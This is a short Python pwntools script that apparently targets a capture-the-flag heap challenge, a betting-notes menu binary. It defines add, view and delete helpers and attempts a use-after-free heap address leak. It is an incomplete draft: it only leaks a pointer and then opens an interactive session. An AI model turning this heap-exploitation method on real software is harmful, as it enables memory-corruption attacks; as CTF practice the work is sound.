#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ['wt.exe','wsl.exe']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'./'
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

def add(seat, size, note):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Seat number: ', str(seat).encode())
    p.sendlineafter(b'Raise amount: ', str(size).encode())
    # fgets akan membaca sampai newline, jadi sendline sudah tepat
    p.sendlineafter(b'Add a note for this bet: ', note)
    log.info(f"Added note to seat {seat} with size {size}")

def view(seat):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Seat number: ', str(seat).encode())
    p.recvuntil(b'their note:\n')
    leak = p.recvline().strip()
    return leak

def delete(seat):
    """Menghapus note."""
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Seat number: ', str(seat).encode())
    log.info(f"Deleted note from seat {seat}")

def leak_heap():
	add(1,64,b'AAAA')
	add(1,64,b'BBBB')
	delete(1)

	leak = view(1)
	return leak

p = start()

heap_leak = u64(leak_heap().ljust(8,b'\x00'))
log.info(hex(heap_leak))

print(view(2))

p.interactive()

